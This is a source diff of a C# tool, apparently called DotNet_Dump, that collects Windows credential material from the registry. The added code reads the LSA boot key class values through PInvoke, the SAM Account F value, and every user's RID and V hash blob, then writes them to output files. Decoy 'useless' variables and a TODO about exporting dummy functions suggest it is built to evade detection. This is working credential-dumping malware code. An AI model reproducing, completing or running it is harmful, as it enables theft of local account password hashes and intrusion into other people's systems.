@@ -8,6 +8,7 @@ using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
 using System.Diagnostics;
+using System.Security.Principal;
 
 
 // could export a bunch of different functions that do nothing ---> TODO
@@ -22,11 +23,19 @@ namespace DotNet_Dump
 {
     public partial class Program
     {
-        // Use PInvoke to call unmanaged Windwos libraries from this app
-        [DllImport("Advapi32.dll", SetLastError = true)]
-        static extern int RegQueryInfoKeyA();
+        // Use PInvoke to call unmanaged Windows libraries from this app
+            // NOTE: a lot of this taken from pinvoke.net 
+        [DllImport("Advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern int RegOpenKeyEx(UIntPtr hKey, string subKey, int ulOptions, int samDesired, out UIntPtr hkResult);
 
+        [DllImport("Advapi32.dll", CharSet=CharSet.Unicode, SetLastError = true)]
+        public static extern int RegQueryInfoKey(UIntPtr hKey, StringBuilder lpClass, ref uint lpcchClass, IntPtr lpReserved, out uint lpcSubKeys, out uint lpcbMaxSubKeyLen, out uint lpcbMaxClassLen, out uint lpcValues, out uint lpcbMaxValueNameLen, out uint lpcbMaxValueLen, out uint lpcbSecurityDescriptor, out long lpftLastWriteTime);  
 
+        [DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError = true)]
+        public static extern int RegCloseKey(UIntPtr hKey);
+
+        [DllImport("kernel32.dll")]
+        static extern uint GetLastError();
 
         static void Main(string[] args)
         {
@@ -42,8 +51,8 @@ namespace DotNet_Dump
         static void execute()
         {
             int status = 0, uselessVar1 = 0x22501984;
-            string key, uselessVar2 = "AC1599DEFFBAB3A5CDDD";
-            string[] userRids, userValues, bootKeyValues;
+            string key, uselessVar2 = "AC1599DEFFBAB3A5CDDD", fKeyValue, bootKeyValue;
+            string[] userRids, userValues;
 
             Debug.WriteLine("Generating key...");
 
@@ -72,12 +81,16 @@ namespace DotNet_Dump
             Debug.WriteLine("Grabbing boot key values...");
 
             // Grab the info we need for our bootkey
-            getBootKeyValues(out bootKeyValues);
+            getBootKeyValue(out bootKeyValue);
+
+            Debug.WriteLine("Grabbing our F key value...");
+
+            grabFKey(out fKeyValue);
 
             Debug.WriteLine("Dumping info...");
 
             // Dump all our info to an output file
-            dumpInfo(bootKeyValues, userRids, userValues);
+            dumpInfo(bootKeyValue, userRids, userValues, fKeyValue);
 
             return;
         }
@@ -117,21 +130,37 @@ namespace DotNet_Dump
             return key;
         }
 
-        static int grabFKey(string fKeyValue)
+
+        /* Grab our special F key from the registry
+         * Input:
+         *      fKeyValue - value of the F key
+         * Return:
+         *      The translated stirng key to our users on target
+         * */
+        static int grabFKey(out string fKeyValue)
         {
             int status = 1;
-            string path = "SAM\\SAM\\Domains\\Account\\F";
+            string path = "SAM\\SAM\\Domains\\Account";
             RegistryKey fKey = Registry.LocalMachine;
 
+            byte[] fValue = (byte[])fKey.OpenSubKey(path).GetValue("F");
 
+            StringBuilder bytes = new StringBuilder();
+            for (int i = 0; i < fValue.Length; i++)
+            {
+                bytes.Append(fValue[i].ToString("x2"));
+            }
+
+            fKeyValue = bytes.ToString();
 
             return status;
         }
 
         /* Grab user RIDs + their V values
          * Input:
-         *      uselessVar1 - useless :)
-         *      uselessVar2 - useless :)
+         *      key - key string (we dont actually use this)
+         *      userRids - array to be filled with all user RIDs on target
+         *      userValues - array to be filled with each user's V key
          * Return:
          *      The translated stirng key to our users on target
          * */
@@ -171,6 +200,8 @@ namespace DotNet_Dump
                         Debug.WriteLine("user rid is " + user);
                     }
 
+                    userRids[index] = user;
+
                     byte[] vValue = (byte[]) currUser.GetValue("V");    
 
                     StringBuilder bytes = new StringBuilder();
@@ -199,54 +230,59 @@ namespace DotNet_Dump
             return status;
         }
 
-
-        // Get registry key class information through reflection
-            // .NET does not expose APIs that allow us to get class information...
-
-
-
-
-
-
-
         /* Grab the bootkey (really just the JD, Skew1, GBG, and Data keys from LSA; we do the calculation later...)
+         * .NET does not expose APIs that allow us to get class information... so we use PInvoke to help us get there
          * Input:
-         *      bootKeyValues - JD, Skew1, GBG and Data keys we need for the bootkey 
+         *      bootKeyValue - JD + Skew1 + GBG + Data keys we need for the bootkey 
          * Return:
          *      N/A
          * */
-        static void getBootKeyValues(out string[] bootKeyValues)
+        //static void getBootKeyValues(out string[] bootKeyValues)
+        static void getBootKeyValue(out string bootKeyValue)
         {
             RegistryKey bootKeyPath = Registry.LocalMachine;
             string[] keys = {"JD", "Skew1", "GBG", "Data"};
             string path = "SYSTEM\\CurrentControlSet\\Control\\Lsa\\";
-            int index = 0;
+            int result = 0, samDesired = 0xF003F; // KEY_ALL_ACCESS
+            UIntPtr hKey = (UIntPtr)0x80000002; // HKLM
+            UIntPtr hResult;
 
-            bootKeyValues = new string[keys.Length];
+            bootKeyValue = "";
 
             foreach (string key in keys)
             {
                 string updatedPath = path + key;
+                StringBuilder classInfo = new StringBuilder();
+                uint classInfoSize = 255, nullArg2 = 0;
+                IntPtr nullArg = IntPtr.Zero;
+                long nullArg3 = 0;
 
-                RegistryKey fullBootPath = bootKeyPath.OpenSubKey(updatedPath);
-                if (fullBootPath == null)
+                result = RegOpenKeyEx(hKey, updatedPath, 0, samDesired, out hResult);
+                if (result != 0)
                 {
-                    Debug.WriteLine("failed to open full boot key path " + updatedPath);
+                    Debug.WriteLine("Failed RegOpenKeyEx! error " + Marshal.GetLastWin32Error().ToString());
                 }
 
-                Object obj = fullBootPath.GetValue("");
-                if (obj == null)
+                // We only care about class info
+                result = RegQueryInfoKey(hResult, classInfo, ref classInfoSize, nullArg, out nullArg2, out nullArg2, out nullArg2, out nullArg2, out nullArg2, out nullArg2, out nullArg2, out nullArg3);
+                if (result != 0)
                 {
-                    Debug.WriteLine("object is null! at " + fullBootPath.Name);
-
+                    Debug.WriteLine("Failed RegQueryInfoKey! error " + Marshal.GetLastWin32Error().ToString());
+                }
+                else
+                {                
+                    bootKeyValue += classInfo.ToString();
                 }
 
+                result = RegCloseKey(hResult);
+                if (result != 0)
+                {
+                    Debug.WriteLine("Failed RegCloseKey! error " + Marshal.GetLastWin32Error().ToString());
+                }
 
-                bootKeyValues.Append(fullBootPath.GetValue("")); // default value for this key 
-                //bootKeyValues[index] = fullBootPath.GetValue("").ToString();
-
-                index++;
             }
+
+            Debug.WriteLine("Bootkey is " + bootKeyValue);
 
             return;
         }
@@ -257,7 +293,8 @@ namespace DotNet_Dump
          * Return:
          *      N/A
          * */
-        static void dumpInfo(in string[] bootKeyValues, in string[] userRids, in string[] userValues)
+        //static void dumpInfo(in string[] bootKeyValues, in string[] userRids, in string[] userValues, string fKeyValue)
+        static void dumpInfo(in string bootKeyValue, in string[] userRids, in string[] userValues, string fKeyValue)
         {
             string dirName = "\\out";
             DirectoryInfo di;
@@ -284,15 +321,18 @@ namespace DotNet_Dump
                 }
             }
 
-            Debug.WriteLine("full path for bootkey is " +  Directory.GetCurrentDirectory() + dirName + "\\" + "key" + ".txt");
+            Debug.WriteLine("full path for bootkey is " +  Directory.GetCurrentDirectory() + dirName + "\\" + "bootkey" + ".txt");
 
             // Separate file for the bootkey info 
-            using (StreamWriter bootKeyFile = new StreamWriter(Directory.GetCurrentDirectory() + dirName + "\\" + "key" + ".txt"))
+            using (StreamWriter bootKeyFile = new StreamWriter(Directory.GetCurrentDirectory() + dirName + "\\" + "bootkey" + ".txt"))
+            {                
+                bootKeyFile.WriteLine(bootKeyValue);                
+            }
+
+            // Separate file for our F key
+            using (StreamWriter fKeyFile = new StreamWriter(Directory.GetCurrentDirectory() + dirName + "\\" + "fkey" + ".txt"))
             {
-                foreach (string key in bootKeyValues)
-                {
-                    bootKeyFile.WriteLine(key);
-                }
+                fKeyFile.WriteLine(fKeyValue);
             }
 
             return;
